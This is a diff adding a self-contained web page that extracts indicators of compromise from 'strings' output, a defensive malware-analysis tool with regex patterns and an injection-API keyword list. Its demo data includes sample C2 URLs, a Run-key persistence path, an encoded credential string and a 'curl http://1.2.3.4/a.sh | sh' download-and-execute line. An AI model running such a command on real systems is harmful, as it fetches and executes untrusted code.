@@ -1,0 +1,708 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Strings IOC Extractor</title>
+  <style>
+    :root{
+      --bg:#0b1020; --card:#121a33; --muted:#9aa6c3; --text:#e8eeff;
+      --line:rgba(255,255,255,.08); --ok:#38d39f; --warn:#ffb020; --bad:#ff4d6d;
+      --shadow: 0 14px 40px rgba(0,0,0,.35); --radius: 18px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
+      background:
+        radial-gradient(1200px 600px at 15% -10%, rgba(72,97,255,.35), transparent 60%),
+        radial-gradient(900px 500px at 100% 0%, rgba(56,211,159,.25), transparent 55%),
+        radial-gradient(800px 500px at 65% 110%, rgba(255,77,109,.18), transparent 55%),
+        var(--bg);
+      color: var(--text);
+      min-height:100vh;
+    }
+    .wrap{max-width:1180px;margin:0 auto;padding:24px}
+    .header{display:flex;gap:18px;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;margin-bottom:18px}
+    .brand{display:flex;gap:14px;align-items:center}
+    .logo{
+      width:44px;height:44px;border-radius:14px;
+      background: linear-gradient(135deg, rgba(72,97,255,.9), rgba(56,211,159,.9));
+      box-shadow: var(--shadow); position:relative; overflow:hidden;
+    }
+    .logo:after{content:"";position:absolute;inset:-40%;
+      background: radial-gradient(circle at 30% 30%, rgba(255,255,255,.35), transparent 55%);
+      transform: rotate(25deg);}
+    h1{font-size:20px;margin:0}
+    .sub{margin:2px 0 0;color:var(--muted);font-size:13px;max-width:760px}
+    .top-actions{display:flex;gap:10px;align-items:center;flex-wrap:wrap;justify-content:flex-end}
+    .btn{
+      border:1px solid var(--line); background: rgba(255,255,255,.04); color: var(--text);
+      padding:10px 12px; border-radius: 12px; cursor:pointer;
+      display:inline-flex;gap:8px;align-items:center; transition:.2s; user-select:none;
+      font-weight:700; font-size:13px;
+    }
+    .btn:hover{background:rgba(255,255,255,.06);border-color:rgba(255,255,255,.16)}
+    .btn.primary{background: linear-gradient(135deg, rgba(72,97,255,.9), rgba(56,211,159,.85)); border:none}
+    .btn.primary:hover{filter: brightness(1.03)}
+    .btn.danger{background: rgba(255,77,109,.12);border-color: rgba(255,77,109,.28)}
+    .btn:disabled{opacity:.5;cursor:not-allowed}
+    .pill{
+      padding:6px 10px;border-radius:999px;border:1px solid var(--line);
+      background: rgba(255,255,255,.04);color:var(--muted); font-size:12px;
+      display:inline-flex;gap:8px;align-items:center;
+    }
+    .grid{display:grid;grid-template-columns: 1.15fr .85fr;gap:14px;align-items:start}
+    @media (max-width: 980px){.grid{grid-template-columns:1fr}.top-actions{justify-content:flex-start}}
+    .card{
+      background: linear-gradient(180deg, rgba(255,255,255,.05), rgba(255,255,255,.02));
+      border:1px solid var(--line); border-radius: var(--radius); box-shadow: var(--shadow); overflow:hidden;
+    }
+    .card .hd{padding:14px;border-bottom:1px solid var(--line);display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap}
+    .card .hd h2{margin:0;font-size:14px}
+    .card .bd{padding:14px}
+    .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+    .field{
+      flex:1;min-width:220px;display:flex;gap:10px;align-items:center;
+      border:1px solid var(--line);border-radius:14px;background: rgba(0,0,0,.18);padding:10px 12px;
+    }
+    .field input{width:100%;background:transparent;border:0;outline:none;color:var(--text);font-size:13px}
+    .drop{border:1px dashed rgba(255,255,255,.2);background: rgba(0,0,0,.20);border-radius:18px;padding:16px;display:flex;flex-direction:column;gap:10px}
+    .drop.drag{border-color: rgba(56,211,159,.55); box-shadow: 0 0 0 3px rgba(56,211,159,.12) inset;}
+    .line{height:1px;background:var(--line)}
+    .kpi{display:grid;grid-template-columns: repeat(3, 1fr);gap:10px}
+    @media (max-width: 560px){.kpi{grid-template-columns: repeat(2,1fr)}}
+    .box{background: rgba(0,0,0,.18);border:1px solid var(--line);border-radius:16px;padding:12px}
+    .n{font-size:18px;font-weight:900}.t{font-size:12px;color:var(--muted);margin-top:4px}
+    .tabs{display:flex;gap:8px;flex-wrap:wrap;padding:10px 14px;border-bottom:1px solid var(--line);background: rgba(0,0,0,.12)}
+    .tab{
+      padding:8px 10px;border-radius:12px;border:1px solid var(--line);background: rgba(255,255,255,.03);
+      cursor:pointer;font-size:12px;font-weight:800;color:var(--muted);display:inline-flex;gap:8px;align-items:center;
+    }
+    .tab.active{color:var(--text);border-color: rgba(72,97,255,.35); background: rgba(72,97,255,.12)}
+    .count{font-size:11px;font-weight:900;padding:3px 7px;border-radius:999px;border:1px solid var(--line);background: rgba(0,0,0,.20);color:var(--text)}
+    .list{display:flex;flex-direction:column;gap:10px}
+    .item{border:1px solid var(--line);background: rgba(0,0,0,.18);border-radius:16px;padding:10px 12px;display:flex;gap:10px;align-items:flex-start;justify-content:space-between}
+    .val{font-family: ui-monospace, Menlo, Consolas, monospace;font-size:12px;line-height:1.45;word-break: break-all;white-space: pre-wrap}
+    .tag{font-size:11px;font-weight:900;padding:4px 8px;border-radius:999px;border:1px solid var(--line);color: var(--muted);background: rgba(255,255,255,.03)}
+    .tag.ok{color: var(--ok); border-color: rgba(56,211,159,.28); background: rgba(56,211,159,.10)}
+    .tag.warn{color: var(--warn); border-color: rgba(255,176,32,.30); background: rgba(255,176,32,.10)}
+    .tag.bad{color: var(--bad); border-color: rgba(255,77,109,.30); background: rgba(255,77,109,.10)}
+    .actions{display:flex;gap:8px;align-items:center;flex:0 0 auto}
+    .iconbtn{width:34px;height:34px;border-radius:12px;border:1px solid var(--line);background: rgba(255,255,255,.03);cursor:pointer;display:grid;place-items:center}
+    .iconbtn:hover{background: rgba(255,255,255,.06)}
+    .hr{height:1px;background:var(--line);margin:10px 0}
+    .hint{font-size:12px;color:var(--muted);line-height:1.5}
+    .toast{
+      position: fixed; bottom: 18px; left: 50%; transform: translateX(-50%);
+      background: rgba(0,0,0,.75); border:1px solid rgba(255,255,255,.12);
+      color: var(--text); padding:10px 12px; border-radius: 14px; box-shadow: var(--shadow);
+      display:none; z-index: 50; font-size: 13px;
+    }
+    .mono{font-family: ui-monospace, Menlo, Consolas, monospace}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <div class="header">
+    <div class="brand">
+      <div class="logo" aria-hidden="true"></div>
+      <div>
+        <h1>Strings IOC Extractor</h1>
+        <div class="sub">Upload your <span class="mono">strings</span> output (<span class="mono">file.txt</span>) and browse indicators by category (URLs, domains, IPs, HTTP, API calls, paths…).</div>
+      </div>
+    </div>
+    <div class="top-actions">
+      <span id="statusPill" class="pill">No file loaded</span>
+      <button class="btn" id="demoBtn">Load demo</button>
+      <button class="btn" id="exportJsonBtn" disabled>Export JSON</button>
+      <button class="btn" id="exportCsvBtn" disabled>Export CSV</button>
+      <button class="btn danger" id="clearBtn" disabled>Clear</button>
+      <button class="btn primary" id="analyzeBtn" disabled>Analyze</button>
+    </div>
+  </div>
+
+  <div class="grid">
+    <div class="card">
+      <div class="hd">
+        <h2>Results</h2>
+        <div class="row" style="flex:1;justify-content:flex-end">
+          <div class="field" style="max-width:520px">
+            <span style="opacity:.7">🔎</span>
+            <input id="searchInput" type="search" placeholder="Filter current category (regex: /http|c2/i)"/>
+          </div>
+        </div>
+      </div>
+      <div class="tabs" id="tabs"></div>
+      <div class="bd">
+        <div id="summary" class="kpi" style="margin-bottom:12px"></div>
+        <div class="hr"></div>
+        <div id="list" class="list"></div>
+        <div id="emptyState" class="hint" style="display:none">
+          No matches for this category / filter.
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="hd">
+        <h2>Input & Settings</h2>
+        <span class="pill"><span>Local</span> • <span>No upload</span></span>
+      </div>
+      <div class="bd">
+        <div id="dropZone" class="drop">
+          <div class="row" style="justify-content:space-between">
+            <div>
+              <div style="font-weight:900">Drop your <span class="mono">file.txt</span> here</div>
+              <div class="hint">Or click “Choose file”.</div>
+            </div>
+            <div class="row">
+              <input id="fileInput" type="file" accept=".txt,.log,.out,.strings,text/plain" hidden />
+              <button class="btn" id="chooseBtn">Choose file</button>
+            </div>
+          </div>
+          <div class="line"></div>
+          <div class="row">
+            <div class="field" style="flex:1;min-width:260px">
+              <span style="opacity:.7">📝</span>
+              <input id="fileName" type="text" placeholder="No file selected" readonly />
+            </div>
+            <span class="pill" id="sizePill">0 KB</span>
+          </div>
+        </div>
+
+        <div class="hr"></div>
+
+        <div class="row">
+          <label class="pill" style="gap:10px;cursor:pointer">
+            <input id="dedupeToggle" type="checkbox" checked />
+            <span>Deduplicate</span>
+          </label>
+          <label class="pill" style="gap:10px;cursor:pointer">
+            <input id="caseToggle" type="checkbox" />
+            <span>Case-insensitive APIs</span>
+          </label>
+        </div>
+
+        <div class="row" style="margin-top:10px">
+          <label class="pill" style="gap:10px;cursor:pointer;flex:1;min-width:260px">
+            <span style="min-width:110px">Min length</span>
+            <input id="minLen" type="range" min="3" max="20" value="4" style="flex:1" />
+            <span id="minLenVal" class="mono">4</span>
+          </label>
+        </div>
+
+        <div class="hr"></div>
+        <div class="hint">
+          Click a category tab to view its items. Use the search to filter inside the current tab.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+(() => {
+  const $ = (id) => document.getElementById(id);
+
+  // ---------- Toast ----------
+  const toastEl = $("toast");
+  let toastTimer = null;
+  function toast(msg){
+    toastEl.textContent = msg;
+    toastEl.style.display = "block";
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(() => toastEl.style.display = "none", 1600);
+  }
+
+  function fmtBytes(bytes){
+    if (!bytes) return "0 KB";
+    const units = ["B","KB","MB","GB"];
+    let i = 0, b = bytes;
+    while (b >= 1024 && i < units.length-1){ b/=1024; i++; }
+    return `${b.toFixed(i?1:0)} ${units[i]}`;
+  }
+
+  // ---------- Categories ----------
+  const CATEGORIES = [
+    { key:"urls",       name:"URLs", icon:"🌐" },
+    { key:"domains",    name:"Domains", icon:"🧭" },
+    { key:"ips",        name:"IPs", icon:"📍" },
+    { key:"http",       name:"HTTP", icon:"🔗" },
+    { key:"headers",    name:"Headers", icon:"🧾" },
+    { key:"useragents", name:"User-Agents", icon:"🕵️" },
+    { key:"apis",       name:"API Calls", icon:"🧩" },
+    { key:"emails",     name:"Emails", icon:"✉️" },
+    { key:"paths",      name:"File Paths", icon:"📁" },
+    { key:"registry",   name:"Registry", icon:"🪟" },
+    { key:"base64",     name:"Base64", icon:"🧬" },
+  ];
+
+  function emptyResults(){
+    const r = {};
+    for (const c of CATEGORIES) r[c.key] = [];
+    return r;
+  }
+
+  // ---------- Regex Patterns ----------
+  const RE_URL = /\b(?:https?|ftp):\/\/[^\s"'<>)\]]+/gi;
+  const RE_DOMAIN = /\b(?:(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)\.)+(?:[a-z]{2,24})\b/gi;
+  const RE_IPV4_PORT = /\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?::\d{1,5})?\b/g;
+  const RE_EMAIL = /\b[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,24}\b/gi;
+  const RE_WIN_PATH = /\b(?:[a-zA-Z]:\\(?:[^\\/:*?"<>|\r\n]+\\)*[^\\/:*?"<>|\r\n]*|\\\\[a-zA-Z0-9._-]+\\[a-zA-Z0-9.$_-]+(?:\\[^\\/:*?"<>|\r\n]+)*)\b/g;
+  const RE_NIX_PATH = /(?<![a-z0-9._-])\/(?:[^\s"']+\/)*[^\s"']+/g;
+  const RE_REG = /\b(?:HKLM|HKCU|HKCR|HKU|HKCC|HKEY_LOCAL_MACHINE|HKEY_CURRENT_USER|HKEY_CLASSES_ROOT|HKEY_USERS|HKEY_CURRENT_CONFIG)\\[^\r\n"]+/g;
+  const RE_HTTP_LINE = /\b(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH|CONNECT)\b[^\r\n]{0,200}\b(?:HTTP\/\d\.\d)?/gi;
+  const RE_HTTP_HEADERS = /\b(?:User-Agent|Host|Referer|Authorization|Cookie|Accept|Content-Type|Connection|X-Forwarded-For)\s*:\s*[^\r\n]{1,200}/gi;
+  const RE_UA = /\b(?:Mozilla\/[0-9.]+|curl\/[0-9.]+|Wget\/[0-9.]+|python-requests\/[0-9.]+|Go-http-client\/[0-9.]+|WinHTTP|PowerShell|okhttp\/[0-9.]+)\b[^\r\n]{0,200}/gi;
+  const RE_BASE64 = /\b(?:[A-Za-z0-9+\/]{24,}={0,2})\b/g;
+  const RE_IDENT = /\b[A-Za-z_][A-Za-z0-9_]{2,64}\b/g;
+
+  const API_KEYWORDS = [
+    "VirtualAlloc","VirtualProtect","WriteProcessMemory","ReadProcessMemory","CreateRemoteThread","OpenProcess",
+    "NtWriteVirtualMemory","NtProtectVirtualMemory","NtCreateThreadEx","QueueUserAPC","SetThreadContext",
+    "CreateProcess","CreateProcessA","CreateProcessW","WinExec","ShellExecute","ShellExecuteA","ShellExecuteW",
+    "GetProcAddress","LoadLibrary","LoadLibraryA","LoadLibraryW","LdrLoadDll","RtlMoveMemory","memcpy",
+    "RegCreateKey","RegCreateKeyEx","RegSetValue","RegSetValueEx","RegOpenKey","RegOpenKeyEx","RegDeleteValue",
+    "CreateService","OpenSCManager","StartService",
+    "CreateFile","CreateFileA","CreateFileW","WriteFile","ReadFile","DeleteFile","MoveFile","CopyFile",
+    "CryptEncrypt","CryptDecrypt","BCryptEncrypt","BCryptDecrypt","IsDebuggerPresent","CheckRemoteDebuggerPresent",
+    "GetTickCount","QueryPerformanceCounter","Sleep",
+    "InternetOpen","InternetOpenUrl","InternetConnect","HttpOpenRequest","HttpSendRequest",
+    "WinHttpOpen","WinHttpConnect","WinHttpOpenRequest","WinHttpSendRequest","WinHttpReadData",
+    "WSAStartup","socket","connect","send","recv","bind","listen","accept","getaddrinfo","inet_addr","URLDownloadToFile",
+    "ptrace","mprotect","mmap","dlopen","dlsym","fork","execve","system","popen"
+  ];
+  const API_SET = new Set(API_KEYWORDS.map(x=>x.toLowerCase()));
+  const API_SUBSTR = ["virtual","process","thread","remote","alloc","protect","write","read","loadlibrary",
+                      "getprocaddress","winhttp","internet","http","socket","connect","send","recv","crypt","reg",
+                      "service","mprotect","mmap","dlopen","dlsym","exec","ptrace"];
+
+  // ---------- Helpers ----------
+  function collectAll(re, text){
+    const out = [];
+    re.lastIndex = 0;
+    let m;
+    while ((m = re.exec(text)) !== null){
+      out.push(m[0]);
+      if (m.index === re.lastIndex) re.lastIndex++;
+    }
+    return out;
+  }
+  function isValidPort(p){
+    const n = Number(p);
+    return Number.isInteger(n) && n >= 1 && n <= 65535;
+  }
+  function normalizeIPPort(ipport){
+    const parts = ipport.split(":");
+    if (parts.length === 2) return isValidPort(parts[1]) ? ipport : parts[0];
+    return ipport;
+  }
+  function escapeHtml(s){
+    return String(s)
+      .replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;")
+      .replaceAll('"',"&quot;").replaceAll("'","&#039;");
+  }
+  function safeCsv(val){
+    const s = String(val ?? "");
+    return /[,"\n]/.test(s) ? `"${s.replace(/"/g,'""')}"` : s;
+  }
+  function parseFilter(s){
+    s = (s || "").trim();
+    if (!s) return null;
+    if (s.startsWith("/") && s.lastIndexOf("/") > 0){
+      const last = s.lastIndexOf("/");
+      const body = s.slice(1,last);
+      const flags = s.slice(last+1);
+      try { return new RegExp(body, flags); } catch { return null; }
+    }
+    return s.toLowerCase();
+  }
+
+  // ---------- Severity ----------
+  function severityFor(cat, value){
+    const v = String(value).toLowerCase();
+    if (cat === "urls"){
+      if (v.includes(".onion") || v.includes("/gate") || v.includes("/panel") || v.includes("/api/")) return "bad";
+      return "warn";
+    }
+    if (cat === "ips") return "warn";
+    if (cat === "http" || cat === "headers" || cat === "useragents"){
+      if (v.includes("authorization") || v.includes("cookie") || v.includes("bearer")) return "bad";
+      return "warn";
+    }
+    if (cat === "apis"){
+      if (/(createremotethread|writeprocessmemory|virtualalloc|ntcreatethreadex|queueuserapc|setthreadcontext)/.test(v)) return "bad";
+      if (/(winhttp|internet|socket|connect|crypt|regsetvalue|createservice)/.test(v)) return "warn";
+      return "ok";
+    }
+    if (cat === "base64") return v.length > 60 ? "warn" : "ok";
+    if (cat === "registry"){
+      if (/(\\run\\|\\runonce\\|\\services\\|\\policies\\)/.test(v)) return "warn";
+      return "ok";
+    }
+    return "ok";
+  }
+
+  // ---------- Extraction (FIXED) ----------
+  function extractIndicators(text, settings){
+    const results = emptyResults();
+
+    const add = (cat, value, meta="") => {
+      results[cat].push({ value, meta, severity: severityFor(cat, value) });
+    };
+
+    // URLs
+    const urls = collectAll(RE_URL, text);
+    urls.forEach(u => add("urls", u));
+
+    // IPs
+    collectAll(RE_IPV4_PORT, text).map(normalizeIPPort).forEach(ip => add("ips", ip));
+
+    // Domains (remove those already inside URL hosts)
+    const urlHosts = new Set();
+    for (const u of urls){
+      try { urlHosts.add(new URL(u).hostname.toLowerCase()); } catch {}
+    }
+    collectAll(RE_DOMAIN, text).forEach(d => {
+      if (!urlHosts.has(d.toLowerCase())) add("domains", d);
+    });
+
+    // HTTP lines / headers / UAs
+    collectAll(RE_HTTP_LINE, text).forEach(x => add("http", x.trim()));
+    collectAll(RE_HTTP_HEADERS, text).forEach(x => add("headers", x.trim()));
+    collectAll(RE_UA, text).forEach(x => add("useragents", x.trim()));
+
+    // Emails
+    collectAll(RE_EMAIL, text).forEach(x => add("emails", x));
+
+    // Paths
+    collectAll(RE_WIN_PATH, text).forEach(x => add("paths", x));
+    collectAll(RE_NIX_PATH, text).forEach(x => { if (x.length >= 6 && !x.startsWith("//")) add("paths", x); });
+
+    // Registry
+    collectAll(RE_REG, text).forEach(x => add("registry", x.trim()));
+
+    // Base64 (filter noise)
+    collectAll(RE_BASE64, text).forEach(b => {
+      if (b.length < 24) return;
+      const uniqueChars = new Set(b).size;
+      if (uniqueChars < 10) return;
+      add("base64", b);
+    });
+
+    // API calls
+    const ci = settings.caseInsensitiveApis;
+    const tokens = collectAll(RE_IDENT, text);
+    for (const tok of tokens){
+      const lower = tok.toLowerCase();
+      const isKnown = API_SET.has(lower);
+      const hasSub = API_SUBSTR.some(s => lower.includes(s));
+      if (!isKnown && !hasSub) continue;
+
+      if (ci){
+        let canonical = tok;
+        for (const k of API_KEYWORDS){ if (k.toLowerCase() === lower){ canonical = k; break; } }
+        add("apis", canonical, isKnown ? "known" : "heuristic");
+      } else {
+        add("apis", tok, isKnown ? "known" : "heuristic");
+      }
+    }
+
+    // Settings: dedupe + minLen + sort
+    if (settings.dedupe){
+      for (const k of Object.keys(results)){
+        const map = new Map();
+        for (const it of results[k]) if (!map.has(it.value)) map.set(it.value, it);
+        results[k] = Array.from(map.values());
+      }
+    }
+
+    const minLen = settings.minLen;
+    for (const k of Object.keys(results)){
+      results[k] = results[k].filter(it => String(it.value).length >= minLen);
+    }
+
+    const sevRank = {bad:0, warn:1, ok:2};
+    for (const k of Object.keys(results)){
+      results[k].sort((a,b) => {
+        const d = sevRank[a.severity] - sevRank[b.severity];
+        if (d) return d;
+        return a.value.localeCompare(b.value);
+      });
+    }
+
+    return results;
+  }
+
+  // ---------- App State ----------
+  let rawText = "";
+  let fileMeta = null;
+
+  const state = {
+    results: emptyResults(),
+    activeTab: "urls"
+  };
+
+  function setEnabled(enabled){
+    $("analyzeBtn").disabled = !enabled;
+    $("clearBtn").disabled = !enabled;
+    $("exportJsonBtn").disabled = !enabled;
+    $("exportCsvBtn").disabled = !enabled;
+  }
+  function setStatus(text){ $("statusPill").textContent = text; }
+
+  // ---------- Rendering ----------
+  function renderTabs(){
+    const tabs = $("tabs");
+    tabs.innerHTML = "";
+    for (const c of CATEGORIES){
+      const btn = document.createElement("button");
+      btn.className = "tab" + (state.activeTab === c.key ? " active" : "");
+      btn.innerHTML = `${c.icon} ${c.name} <span class="count">${(state.results[c.key]||[]).length}</span>`;
+      btn.addEventListener("click", () => {
+        state.activeTab = c.key;
+        renderTabs();
+        renderList();
+      });
+      tabs.appendChild(btn);
+    }
+  }
+
+  function renderSummary(){
+    const el = $("summary");
+    const totals = CATEGORIES.map(c => (state.results[c.key]||[]).length);
+    const sum = totals.reduce((a,b)=>a+b,0);
+
+    const top3 = [...CATEGORIES]
+      .map(c => ({...c, n:(state.results[c.key]||[]).length}))
+      .sort((a,b)=>b.n-a.n)
+      .slice(0,3);
+
+    el.innerHTML = "";
+    const boxes = [
+      { n: sum, t: "Total findings" },
+      { n: (fileMeta?.lines ?? 0), t: "Lines scanned" },
+      { n: (fileMeta?.chars ?? 0), t: "Characters" },
+      { n: top3[0]?.n ?? 0, t: `Top: ${top3[0]?.name ?? "-"}` },
+      { n: top3[1]?.n ?? 0, t: `2nd: ${top3[1]?.name ?? "-"}` },
+      { n: top3[2]?.n ?? 0, t: `3rd: ${top3[2]?.name ?? "-"}` },
+    ];
+    for (const b of boxes){
+      const d = document.createElement("div");
+      d.className = "box";
+      d.innerHTML = `<div class="n">${b.n}</div><div class="t">${b.t}</div>`;
+      el.appendChild(d);
+    }
+  }
+
+  function renderList(){
+    const list = $("list");
+    const empty = $("emptyState");
+    const parsed = parseFilter($("searchInput").value);
+
+    const items = state.results[state.activeTab] || [];
+    const filtered = items.filter(it => {
+      const v = it.value;
+      if (!parsed) return true;
+      if (parsed instanceof RegExp) return parsed.test(v);
+      return v.toLowerCase().includes(parsed);
+    });
+
+    list.innerHTML = "";
+    empty.style.display = filtered.length ? "none" : "block";
+
+    for (const it of filtered){
+      const row = document.createElement("div");
+      row.className = "item";
+
+      const tagCls = it.severity === "bad" ? "bad" : it.severity === "warn" ? "warn" : "ok";
+      const meta = it.meta ? ` • <span style="opacity:.7">${escapeHtml(it.meta)}</span>` : "";
+
+      row.innerHTML = `
+        <div style="min-width:0">
+          <div class="val">${escapeHtml(it.value)}</div>
+          <div style="font-size:12px;opacity:.7">${state.activeTab}${meta}</div>
+        </div>
+        <div class="actions">
+          <span class="tag ${tagCls}">${it.severity.toUpperCase()}</span>
+          <button class="iconbtn" title="Copy">📋</button>
+        </div>
+      `;
+
+      row.querySelector(".iconbtn").addEventListener("click", async () => {
+        await navigator.clipboard.writeText(it.value);
+        toast("Copied");
+      });
+
+      list.appendChild(row);
+    }
+  }
+
+  function refreshUI(){
+    renderTabs();
+    renderSummary();
+    renderList();
+  }
+
+  // ---------- File load ----------
+  async function loadTextFromFile(file){
+    const text = await file.text();
+    rawText = text;
+    fileMeta = {
+      name: file.name, size: file.size, chars: text.length,
+      lines: (text.match(/\r?\n/g)?.length ?? 0) + (text.length ? 1 : 0)
+    };
+    $("fileName").value = file.name;
+    $("sizePill").textContent = fmtBytes(file.size);
+    setStatus(`Loaded: ${file.name}`);
+    setEnabled(true);
+  }
+
+  // ---------- Export ----------
+  function buildExportObject(){
+    return {
+      meta: {
+        generated_at: new Date().toISOString(),
+        file: fileMeta,
+        settings: {
+          dedupe: $("dedupeToggle").checked,
+          case_insensitive_api: $("caseToggle").checked,
+          min_len: Number($("minLen").value || 4)
+        }
+      },
+      results: state.results
+    };
+  }
+
+  function download(filename, content, mime){
+    const blob = new Blob([content], {type: mime});
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url; a.download = filename;
+    document.body.appendChild(a);
+    a.click(); a.remove();
+    URL.revokeObjectURL(url);
+  }
+
+  function exportJSON(){
+    download("ioc_results.json", JSON.stringify(buildExportObject(), null, 2), "application/json");
+    toast("Exported JSON");
+  }
+
+  function exportCSV(){
+    const rows = [["category","value","severity","meta"]];
+    for (const c of CATEGORIES){
+      for (const it of (state.results[c.key] || [])){
+        rows.push([c.key, it.value, it.severity, it.meta || ""]);
+      }
+    }
+    const csv = rows.map(r => r.map(safeCsv).join(",")).join("\n");
+    download("ioc_results.csv", csv, "text/csv");
+    toast("Exported CSV");
+  }
+
+  // ---------- Events ----------
+  $("chooseBtn").addEventListener("click", () => $("fileInput").click());
+  $("fileInput").addEventListener("change", async (e) => {
+    const file = e.target.files?.[0];
+    if (file) await loadTextFromFile(file);
+  });
+
+  const drop = $("dropZone");
+  drop.addEventListener("dragover", (e) => { e.preventDefault(); drop.classList.add("drag"); });
+  drop.addEventListener("dragleave", () => drop.classList.remove("drag"));
+  drop.addEventListener("drop", async (e) => {
+    e.preventDefault(); drop.classList.remove("drag");
+    const file = e.dataTransfer.files?.[0];
+    if (file) await loadTextFromFile(file);
+  });
+
+  $("minLen").addEventListener("input", () => $("minLenVal").textContent = $("minLen").value);
+
+  $("analyzeBtn").addEventListener("click", () => {
+    if (!rawText) return;
+
+    const settings = {
+      dedupe: $("dedupeToggle").checked,
+      caseInsensitiveApis: $("caseToggle").checked,
+      minLen: Number($("minLen").value || 4)
+    };
+
+    state.results = extractIndicators(rawText, settings);
+    // keep active tab, but if empty switch to the first non-empty tab
+    if ((state.results[state.activeTab] || []).length === 0){
+      const firstNonEmpty = CATEGORIES.find(c => (state.results[c.key]||[]).length > 0)?.key;
+      state.activeTab = firstNonEmpty || "urls";
+    }
+    refreshUI();
+    toast("Analysis complete");
+  });
+
+  $("clearBtn").addEventListener("click", () => {
+    rawText = ""; fileMeta = null;
+    state.results = emptyResults();
+    state.activeTab = "urls";
+    $("fileInput").value = "";
+    $("fileName").value = "";
+    $("sizePill").textContent = "0 KB";
+    $("searchInput").value = "";
+    setStatus("No file loaded");
+    setEnabled(false);
+    refreshUI();
+    toast("Cleared");
+  });
+
+  $("searchInput").addEventListener("input", renderList);
+  $("exportJsonBtn").addEventListener("click", exportJSON);
+  $("exportCsvBtn").addEventListener("click", exportCSV);
+
+  $("demoBtn").addEventListener("click", () => {
+    const demo = `
+GET /api/v1/panel HTTP/1.1
+Host: c2.example-domain.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Authorization: Bearer %s
+https://evil.example.com/gate.php?id=123
+http://185.203.119.2:8080/connect
+192.168.1.10:4444
+CreateRemoteThread
+WriteProcessMemory
+VirtualAlloc
+LoadLibraryA
+GetProcAddress
+WinHttpOpenRequest
+InternetConnectW
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
+C:\\Users\\Public\\svchost.exe
+/bin/bash -c curl http://1.2.3.4/a.sh | sh
+dXNlcm5hbWU6YWRtaW4gcGFzc3dvcmQ6c2VjcmV0MTIz
+contact@malicious.example
+`;
+    rawText = demo;
+    fileMeta = { name:"demo_strings.txt", size: demo.length, chars: demo.length, lines: demo.split(/\r?\n/).length };
+    $("fileName").value = fileMeta.name;
+    $("sizePill").textContent = fmtBytes(fileMeta.size);
+    setStatus("Loaded demo");
+    setEnabled(true);
+
+    const settings = {
+      dedupe: $("dedupeToggle").checked,
+      caseInsensitiveApis: $("caseToggle").checked,
+      minLen: Number($("minLen").value || 4)
+    };
+    state.results = extractIndicators(rawText, settings);
+    state.activeTab = "urls";
+    refreshUI();
+    toast("Demo loaded");
+  });
+
+  // init
+  setEnabled(false);
+  refreshUI();
+})();
+</script>
+</body>
+</html>
